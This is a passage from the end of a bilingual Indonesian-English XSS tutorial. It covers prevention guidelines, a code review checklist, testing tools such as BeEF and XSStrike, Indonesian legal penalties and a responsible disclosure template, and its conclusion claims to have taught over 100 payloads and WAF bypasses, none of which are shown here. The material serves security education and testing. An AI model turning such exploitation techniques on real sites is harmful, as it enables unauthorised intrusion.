    }
    
    return originalFetch.call(this, url, options);
};
```

### 9. Education & Awareness

#### Developer Training:
```markdown
# XSS Prevention Guidelines

## DO:
- Use parameterized queries (SQL injection prevention too)
- Implement Content Security Policy (CSP)
- Validate ALL user input
- Encode output based on context
- Use HTTP security headers
- Regular security testing

## DON'T:
- Use innerHTML with user data
- Use eval() with user data
- Trust data from client-side
- Bypass security for convenience
- Skip input validation

## Tools:
- OWASP ZAP for testing
- CSP Evaluator
- HTML Purifier
- DOMPurify
```

#### Secure Code Review Checklist:
```markdown
# XSS Code Review Checklist

## Input Validation
- [ ] All user inputs validated
- [ ] Whitelist approach used
- [ ] Input length limits
- [ ] Data type validation

## Output Encoding  
- [ ] Context-aware encoding
- [ ] No inline JavaScript
- [ ] Safe DOM manipulation
- [ ] URL encoding for links

## Security Headers
- [ ] CSP implemented
- [ ] X-Frame-Options set
- [ ] X-Content-Type-Options set
- [ ] HSTS enabled

## Framework Security
- [ ] Automatic escaping enabled
- [ ] Safe APIs used
- [ ] Latest versions
- [ ] Security patches applied
```

---

## Tools & Resources

### Testing Tools:
1. **Burp Suite** - Professional web vulnerability scanner
2. **OWASP ZAP** - Open source alternative
3. **XSStrike** - Advanced XSS detection
4. **XSS Hunter** - Blind XSS testing
5. **BeEF** - Browser exploitation framework

### Browser Extensions:
1. **XSS Helper** - Quick XSS testing
2. **Max** - Automated XSS tester
3. **HTTP Header Editor** - Modify security headers
4. **CSP Evaluator** - Check CSP policies

### Online Resources:
1. **PortSwigger XSS Cheat Sheet** - Comprehensive reference
2. **OWASP XSS Prevention Cheat Sheet** - Prevention guidelines
3. **HTML5 Security Cheat Sheet** - New vectors
4. **CSP Reference** - CSP directives

### Practice Platforms:
1. **PentesterLab** - XSS exercises
2. **Web Security Academy (PortSwigger)** - Free labs
3. **HackTheBox** - Challenges
4. **TryHackMe** - Beginner-friendly

### Libraries for Prevention:
1. **DOMPurify** - HTML sanitizer
2. **js-xss** - XSS filter for Node.js
3. **HTMLPurifier** - PHP HTML filter
4. **sanitize-html** - Node.js HTML sanitizer

---

## Legal & Ethical Considerations

### Hukum Indonesia (UU ITE):
- **Pasal 30**: Akses ilegal sistem komputer (6 tahun/1M)
- **Pasal 31**: Intersepsi ilegal (10 tahun/1M)  
- **Pasal 32**: Perusakan data (8 tahun/2M)
- **Pasal 45**: Penyebaran konten ilegal (6 tahun/1M)

### Ethical Guidelines:
1. **Authorization selalu** - Dapatkan izin tertulis
2. **Scope jelas** - Tetap dalam scope testing
3. **No damage** - Jangan menyebabkan kerusakan
4. **Confidentiality** - Jangan expose data sensitif
5. **Responsible disclosure** - Laporkan vulnerability

### Bug Bounty Programs:
- **Tokopedia** - Bug bounty program
- **Bukalapak** - Security vulnerability program
- **Traveloka** - Responsible disclosure
- **Gojek** - Security acknowledgement

### Responsible Disclosure Template:
```markdown
Subject: Security Vulnerability Report - [Website Name]

Dear Security Team,

I discovered a security vulnerability on your website:

**Vulnerability Type**: Cross-Site Scripting (XSS)
**Location**: https://example.com/page?q=[parameter]
**Risk Level**: [High/Medium/Low]
**Proof of Concept**: [Steps to reproduce]
**Impact**: [What attacker can do]

**Suggested Fix**:
1. Implement input validation
2. Add output encoding
3. Deploy Content Security Policy

I am available to provide more details if needed.

Best regards,
[Your Name]
```

---

## Kesimpulan

Dengan memahami 100+ payload XSS ini, Anda memiliki:

### 1. **Pengetahuan Komprehensif** tentang:
- Berbagai tipe XSS (Reflected, Stored, DOM-based)
- Teknik bypass filter dan WAF
- Advanced attack vectors
- Prevention strategies

### 2. **Kemampuan untuk**:
- Mengidentifikasi vulnerability XSS
- Mengeksploitasi dengan payload yang tepat
- Mengimplementasikan prevention measures
- Melakukan security testing yang efektif

### 3. **Tools & Resources** untuk:
- Automated testing
- Manual testing
- Prevention implementation
- Continuous monitoring

### Prinsip Penting:
1. **Never trust user input** - Validate everything
2. **Context matters** - Encode based on output context
3. **Defense in depth** - Multiple layers of protection
4. **Stay updated** - New vectors emerge constantly
5. **Think like attacker** - But act like defender

### Action Items:
1. ✅ Review aplikasi Anda untuk vulnerability XSS
2. ✅ Implement CSP dan security headers
3. ✅ Lakukan regular security testing
4. ✅ Edukasi tim tentang XSS prevention
5. ✅ Setup monitoring dan incident response

**Ingat**: Keamanan adalah proses, bukan produk. Terus belajar, testing, dan improving!

---
**Disclaimer**: Informasi ini untuk tujuan edukasi dan security testing dengan izin. Selalu patuhi hukum dan etika dalam aktivitas security testing.
